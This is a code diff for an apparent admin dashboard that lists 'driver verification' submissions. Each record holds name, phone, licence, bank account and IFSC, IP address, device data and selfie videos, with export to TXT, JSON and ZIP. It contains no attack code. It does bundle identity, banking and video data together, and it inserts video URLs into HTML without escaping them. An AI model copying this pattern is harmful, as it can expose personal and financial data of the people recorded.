+            'Browser/OS: ' + parseBrowserOS(e.rawDevice),
+            'Device: ' + (e.device||'-'),
+            'IP Address: ' + (e.ip||'-'),
+            'Submitted: ' + fmt(e.timestamp),
+            'Case ID: ' + (e.caseId||'-'),
+            'Language: ' + (e.lang==='hi'?'Hindi':'English'),
+            'Video 1 URL: ' + (e.video1Url||'N/A'),
+            'Video 2 URL: ' + (e.video2Url||'N/A'),
+            'Raw UA: ' + (e.rawDevice||'-'),
+            '======================================='
+        ].join('\n');
+        folder.file('info.txt', txtContent);
+        folder.file('info.json', JSON.stringify(e, null, 2));
+        
+        if (e.video1Url) {
+            if (zipBtn) zipBtn.textContent = '⏳ Downloading video 1...';
+            try {
+                const blob1 = await downloadFileAsBlob(e.video1Url);
+                folder.file('selfie1.webm', blob1);
+            } catch (err) { folder.file('video1_failed.txt', 'Video 1 download failed: ' + e.video1Url); }
+        }
+        
+        if (e.video2Url) {
+            if (zipBtn) zipBtn.textContent = '⏳ Downloading video 2...';
+            try {
+                const blob2 = await downloadFileAsBlob(e.video2Url);
+                folder.file('selfie2.webm', blob2);
+            } catch (err) { folder.file('video2_failed.txt', 'Video 2 download failed: ' + e.video2Url); }
+        }
+        
+        if (zipBtn) zipBtn.textContent = '⏳ Compressing ZIP...';
+        const content = await zip.generateAsync({ type: 'blob', compression: 'DEFLATE' });
+        saveBlob(content, `verification_${(e.mobile||'unknown').replace(/[^a-zA-Z0-9]/g,'')}_${Date.now()}.zip`);
+        
+        if (zipBtn) { zipBtn.disabled = false; zipBtn.textContent = '📦 Download as ZIP (All + Videos)'; }
+        showToast('✅ ZIP downloaded successfully');
+    } catch (err) {
+        if (zipBtn) { zipBtn.disabled = false; zipBtn.textContent = '📦 Download as ZIP (All + Videos)'; }
+        showToast('❌ ZIP failed: ' + err.message);
+    }
+}
+
+function openDetail(id){
+    const e = allEntries.find(x => x.id === id);
+    if (!e) return;
+    currentDetail = e;
+    document.getElementById('modalTitle').textContent = e.name || 'Entry Details';
+
+    const videoBlock = (n, url) => url ? `
+        <div class="video-card">
+            <video controls playsinline src="${url}"></video>
+            <div class="video-actions">
+                <button class="btn-dark" onclick="downloadSingleVideo(${n})">⬇ Download</button>
+                <button class="btn-light" onclick="copyUrl(${n})">🔗 Copy Link</button>
+            </div>
+        </div>` : '<div class="no-video">Video ' + n + ' not available</div>';
+
+    document.getElementById('modalBody').innerHTML = `
+    <div class="card" style="margin-bottom:14px;">
+        <div class="sec-title">Driver Information</div>
+        <div class="info-row"><span class="info-label">Name</span><span class="info-value">${esc(e.name||'—')}</span></div>
+        <div class="info-row"><span class="info-label">Mobile</span><span class="info-value">${esc(e.mobile||'—')}</span></div>
+        <div class="info-row"><span class="info-label">Licence</span><span class="info-value">${esc(e.licence||'—')}</span></div>
+        <div class="info-row"><span class="info-label">Case ID</span><span class="info-value">${esc(e.caseId||'—')}</span></div>
+    </div>
+    <div class="card" style="margin-bottom:14px;">
+        <div class="sec-title">Wallet / Bank</div>
+        <div class="info-row"><span class="info-label">Holder</span><span class="info-value">${esc(e.holder||'—')}</span></div>
+        <div class="info-row"><span class="info-label">Account</span><span class="info-value">${esc(e.wallet||'—')}</span></div>
+        <div class="info-row"><span class="info-label">IFSC</span><span class="info-value">${esc(e.ifsc||'—')}</span></div>
+    </div>
+    <div class="card" style="margin-bottom:14px;">
+        <div class="sec-title">Device & Network</div>
+        <div class="info-row"><span class="info-label">Browser/OS</span><span class="info-value">${esc(parseBrowserOS(e.rawDevice))}</span></div>
+        <div class="info-row"><span class="info-label">Device</span><span class="info-value">${esc(e.device||'—')}</span></div>
+        <div class="info-row"><span class="info-label">IP Address</span><span class="info-value">${esc(e.ip||'—')}</span></div>
+        <div class="info-row"><span class="info-label">Submitted</span><span class="info-value">${fmt(e.timestamp)}</span></div>
+        <div class="info-row"><span class="info-label">Language</span><span class="info-value">${e.lang==='hi'?'Hindi':'English'}</span></div>
+    </div>
+    <div class="card" style="margin-bottom:14px;">
+        <div class="sec-title">Recorded Videos</div>
+        ${videoBlock(1, e.video1Url)}
+        ${videoBlock(2, e.video2Url)}
+        <div style="padding: 12px 16px 16px;">
+            <button class="btn-zip" id="zipBtn" onclick="downloadAsZip()">📦 Download as ZIP (All + Videos)</button>
+        </div>
+    </div>
+    <div class="modal-actions">
+        <button class="btn-light" onclick="exportEntry('txt')">📄 TXT</button>
+        <button class="btn-light" onclick="exportEntry('json')">🧾 JSON</button>
+    </div>
+    <div style="padding:0 16px 16px;">
+        <button class="btn-danger-ghost" onclick="deleteCurrentEntry()">🗑 Delete This Entry</button>
+    </div>
+    <div class="raw-box">${esc(e.rawDevice||'No raw device info')}</div>`;
+
+    document.getElementById('detailModal').classList.add('active');
+}
+function closeModal(){ document.getElementById('detailModal').classList.remove('active'); currentDetail = null; }
+document.getElementById('detailModal').addEventListener('click', e => { if (e.target.id === 'detailModal') closeModal(); });
+
+async function downloadSingleVideo(n) {
+    if (!currentDetail) return;
+    const url = n === 1 ? currentDetail.video1Url : currentDetail.video2Url;
+    if (!url) { showToast('❌ Video not available'); return; }
+    showToast('⬇ Downloading video ' + n + '...');
+    try {
+        const blob = await downloadFileAsBlob(url);
+        saveBlob(blob, `selfie${n}_${currentDetail.mobile || 'unknown'}.webm`);
+        showToast('✅ Video ' + n + ' saved');
+    } catch (err) {
+        window.open(url, '_blank');
+        showToast('🔗 Opened in new tab');
+    }
+}
+function copyUrl(n){
+    if (!currentDetail) return;
+    const url = n === 1 ? currentDetail.video1Url : currentDetail.video2Url;
+    if (!url) { showToast('❌ No video link'); return; }
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(url).then(() => showToast('🔗 Link copied')).catch(() => prompt('Copy link:', url));
+    } else { prompt('Copy link:', url); }
+}
+function exportEntry(format){
+    if (!currentDetail) return;
+    const e = currentDetail;
+    if (format === 'json') {
+        saveBlob(new Blob([JSON.stringify(e, null, 2)], { type: 'application/json' }), `record_${e.mobile||'unknown'}.json`);
+        showToast('✅ JSON exported');
+    } else {
+        const txt = [
+            '===== DRIVER VERIFICATION RECORD =====',
+            'Name: ' + (e.name||'-'), 'Mobile: ' + (e.mobile||'-'), 'Licence: ' + (e.licence||'-'),
+            'Account Holder: ' + (e.holder||'-'), 'Wallet/Bank: ' + (e.wallet||'-'), 'IFSC: ' + (e.ifsc||'-'),
+            'Browser/OS: ' + parseBrowserOS(e.rawDevice), 'Device: ' + (e.device||'-'), 'IP: ' + (e.ip||'-'),
+            'Submitted: ' + fmt(e.timestamp), 'Case ID: ' + (e.caseId||'-'),
+            'Video 1 URL: ' + (e.video1Url||'N/A'), 'Video 2 URL: ' + (e.video2Url||'N/A'),
+            'Raw UA: ' + (e.rawDevice||'-'), '======================================='
+        ].join('\n');
+        saveBlob(new Blob([txt], { type: 'text/plain' }), `record_${e.mobile||'unknown'}.txt`);
+        showToast('✅ TXT exported');
+    }
+}
+function deleteCurrentEntry(){
+    if (!currentDetail) return;
+    if (!confirm('Delete this entry permanently?')) return;
+    db.ref('verifications/' + currentDetail.id).remove().then(() => { closeModal(); showToast('🗑 Entry deleted'); });
+}
+</script>
+</body>
+</html>
